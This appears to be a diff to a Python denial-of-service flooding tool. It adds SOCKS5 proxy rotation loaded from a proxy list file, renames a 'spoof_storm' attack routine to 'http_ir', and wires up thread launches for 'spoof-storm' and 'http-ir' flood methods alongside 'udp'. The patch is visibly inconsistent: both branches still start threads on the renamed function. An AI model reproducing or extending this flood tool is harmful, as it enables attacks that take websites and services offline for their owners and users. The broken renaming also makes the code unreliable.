@@ -725,6 +725,7 @@ def main():
                                     s = ctx.wrap_socket(s , server_hostname=target)
                                     s.connect((target , port))
                                 else:
+                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                     s = socksocket()
                                     pri = che(sok5).split(':');
                                     s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
@@ -737,7 +738,7 @@ def main():
                             except:
                                 pass
                             
-                    def spoof_storm():
+                    def http_ir():
                         while time() < timer:
                             try:
                                 if url.split('://')[0] == 'https':
@@ -1130,6 +1131,9 @@ def main():
                         for _ in range(threads):
                             thr(target=https).start()
                     elif method == 'spoof-storm':
+                        for _ in range(threads):
+                            thr(target=spoof_storm).start()
+                    elif method == 'http-ir':
                         for _ in range(threads):
                             thr(target=spoof_storm).start()
                     elif method == 'udp':
